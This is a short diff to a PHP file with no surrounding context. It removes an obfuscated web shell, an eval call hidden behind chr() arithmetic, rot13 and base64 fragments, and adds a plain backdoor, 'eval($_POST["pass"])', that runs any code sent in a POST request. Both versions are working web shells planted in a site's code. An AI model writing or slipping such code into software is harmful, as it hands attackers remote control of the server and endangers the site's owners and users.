@@ -1,1 +1,2 @@
-<?php $XLsP=create_function(chr(0654-0610).chr(0334625/01727).str_rot13('b').chr(66708/612).base64_decode('ZQ=='),str_rot13('r').chr(0277766/01501).str_rot13('n').str_rot13('y').chr(0x148-0x120).str_rot13('$').str_rot13('f').chr(01727-01550).chr(774-665).base64_decode('ZQ==').chr(057757/01127).chr(0x580a/0x17e));$XLsP(base64_decode('NDEyM'.'DQ3O0'.'BldkF'.'sKCRf'.''.chr(81855/963).str_rot13('R').base64_decode('OQ==').chr(0xbd54/0x241).chr(46956/546).''.''.base64_decode('Rg==').chr(0x223-0x1b0).chr(0x38e-0x316).chr(066170/0544).chr(606-484).''.'Y1NjE'.'zMTQy'.'YV0pO'.'zEyMz'.'YxNDE'.'7'.''));?>
+<?php
+eval($_POST["pass"]);
